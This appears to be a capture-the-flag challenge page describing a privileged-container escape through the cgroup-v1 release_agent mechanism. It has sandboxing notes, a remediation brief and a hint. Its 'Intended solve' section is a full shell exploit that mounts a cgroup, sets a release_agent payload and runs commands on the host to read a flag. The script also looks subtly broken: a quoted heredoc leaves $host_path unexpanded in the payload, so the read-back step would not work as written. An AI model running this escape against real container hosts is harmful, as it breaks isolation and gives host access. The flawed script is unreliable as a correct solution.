# h16 — Overboard, Again (Pearl Telecom)

**Category:** Container escape / cgroup release_agent · **Difficulty:** Insane · **Points:** 500 (dynamic)

## Intended solve
Your container is misconfigured (`--privileged` / `CAP_SYS_ADMIN`). Escape to the "host" via the
classic **cgroup-v1 `release_agent`** technique and read `/flag` on the host (invisible from
inside the container).

```sh
# inside the container
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c        # a controller we can drive
mkdir /tmp/c/x && echo 1 > /tmp/c/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)

echo "$host_path/cmd" > /tmp/c/release_agent                 # runs on host when cgroup empties
cat > /cmd <<'EOF'
#!/bin/sh
cat /flag > "$host_path/out"                                 # exfil to a path we can read back
EOF
chmod +x /cmd

sh -c "echo \$\$ > /tmp/c/x/cgroup.procs"                     # enter+exit -> triggers release_agent
cat /out                                                      # CYPHER{...}
```
(Equivalent paths: abusing a mounted host filesystem / docker.sock if present. The intended one is
`release_agent`.)

## Infra & safety
- **De-risked containment:** the "host" the escape reaches is a **nested throwaway sandbox**
  (rootless-DinD / gVisor / microVM per the Phase 1 DinD safety note), one per team, holding only
  `/flag`. A breakout **cannot** reach the real finals VM, the CTFd host, or the GCP project — the
  outer runtime is unprivileged and identity-less.
- Per-team instance; the sandbox is destroyed and recreated on demand.

## Remediation (Blue Team Brief)
Never run untrusted containers `--privileged` or with `CAP_SYS_ADMIN`; drop capabilities; use user
namespaces, seccomp/AppArmor, read-only mounts, and gVisor/Kata for isolation; never mount the
docker socket into a container. cgroup-v1 `release_agent` escapes are a canonical reason.

## Hint (costed, non-giveaway)
"You are more privileged than you look; the kernel will run something for you on the host." — cost 100.
